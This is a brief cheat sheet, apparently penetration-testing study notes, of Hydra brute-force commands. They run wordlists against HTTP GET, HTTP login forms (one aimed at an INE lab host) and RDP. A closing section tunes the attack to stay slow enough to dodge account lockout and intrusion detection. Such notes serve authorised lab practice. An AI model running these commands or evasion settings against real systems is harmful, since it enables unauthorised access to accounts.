# Hydra Brute-Forcing

hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target_ip> -s <target_port> http-get

hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target_ip> -s <target_port> http-post-form 

hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"

##### Secure Scan

hydra -l <user> -P /usr/share/wordlists/rockyou.txt rdp://<target_ip> -t 1 -W 3

-t 1 -> Sets the number of parallel tasks (connections) to 1. This makes the attack very slow and stealthier.
-W 3 -> Sets the wait time between login attempts for each thread to 3 seconds. This further slows
down the attack to avoid triggering account lockout policies or intrusion detection systems.
